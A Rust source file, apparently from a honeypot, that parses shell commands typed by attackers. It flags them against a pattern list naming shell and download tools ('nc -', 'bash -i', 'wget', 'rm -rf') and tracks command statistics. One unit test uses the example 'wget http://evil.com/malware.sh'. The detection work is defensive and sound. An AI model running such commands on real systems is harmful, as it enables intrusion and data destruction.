//! Command Parser für Shell-Interaktionen
//!
//! Parsed und analysiert Angreifer-Commands

use std::collections::HashMap;

/// Parsed Command
#[derive(Debug, Clone)]
pub struct Command {
    pub name: String,
    pub args: Vec<String>,
    pub raw: String,
    pub is_malicious: bool,
}

/// Command Parser
pub struct CommandParser {
    malicious_patterns: Vec<String>,
    command_history: Vec<Command>,
}

impl CommandParser {
    pub fn new() -> Self {
        Self {
            malicious_patterns: vec![
                "rm -rf".to_string(),
                "wget".to_string(),
                "curl".to_string(),
                "nc -".to_string(),
                "bash -i".to_string(),
                "/bin/sh".to_string(),
                "chmod +x".to_string(),
                "base64 -d".to_string(),
                "python -c".to_string(),
                "perl -e".to_string(),
                "sudo".to_string(),
                "passwd".to_string(),
                "useradd".to_string(),
                "iptables".to_string(),
            ],
            command_history: Vec::new(),
        }
    }

    /// Parse command line input
    pub fn parse(&mut self, input: &str) -> Command {
        let trimmed = input.trim();
        let parts: Vec<&str> = trimmed.split_whitespace().collect();

        let (name, args) = if !parts.is_empty() {
            (parts[0].to_string(), parts[1..].iter().map(|s| s.to_string()).collect())
        } else {
            (String::new(), Vec::new())
        };

        let is_malicious = self.is_malicious_command(trimmed);

        let cmd = Command {
            name: name.clone(),
            args,
            raw: trimmed.to_string(),
            is_malicious,
        };

        self.command_history.push(cmd.clone());
        cmd
    }

    /// Check if command is malicious
    fn is_malicious_command(&self, cmd: &str) -> bool {
        self.malicious_patterns.iter().any(|pattern| cmd.contains(pattern))
    }

    /// Get command statistics
    pub fn get_stats(&self) -> CommandStats {
        let total = self.command_history.len();
        let malicious = self.command_history.iter().filter(|c| c.is_malicious).count();
        let unique_commands: std::collections::HashSet<_> = 
            self.command_history.iter().map(|c| &c.name).collect();

        CommandStats {
            total_commands: total,
            malicious_commands: malicious,
            unique_commands: unique_commands.len(),
            most_common: self.get_most_common_command(),
        }
    }

    /// Get most common command
    fn get_most_common_command(&self) -> Option<String> {
        let mut counts: HashMap<String, usize> = HashMap::new();
        for cmd in &self.command_history {
            *counts.entry(cmd.name.clone()).or_insert(0) += 1;
        }
        counts.into_iter().max_by_key(|(_, count)| *count).map(|(name, _)| name)
    }

    /// Get command history
    pub fn history(&self) -> &[Command] {
        &self.command_history
    }
}

impl Default for CommandParser {
    fn default() -> Self {
        Self::new()
    }
}

/// Command statistics
#[derive(Debug, Clone)]
pub struct CommandStats {
    pub total_commands: usize,
    pub malicious_commands: usize,
    pub unique_commands: usize,
    pub most_common: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_simple_command() {
        let mut parser = CommandParser::new();
        let cmd = parser.parse("ls -la");
        assert_eq!(cmd.name, "ls");
        assert_eq!(cmd.args, vec!["-la"]);
        assert!(!cmd.is_malicious);
    }

    #[test]
    fn test_parse_malicious_command() {
        let mut parser = CommandParser::new();
        let cmd = parser.parse("wget http://evil.com/malware.sh");
        assert_eq!(cmd.name, "wget");
        assert!(cmd.is_malicious);
    }

    #[test]
    fn test_command_history() {
        let mut parser = CommandParser::new();
        parser.parse("ls");
        parser.parse("pwd");
        parser.parse("whoami");
        
        let stats = parser.get_stats();
        assert_eq!(stats.total_commands, 3);
        assert_eq!(stats.unique_commands, 3);
    }
}
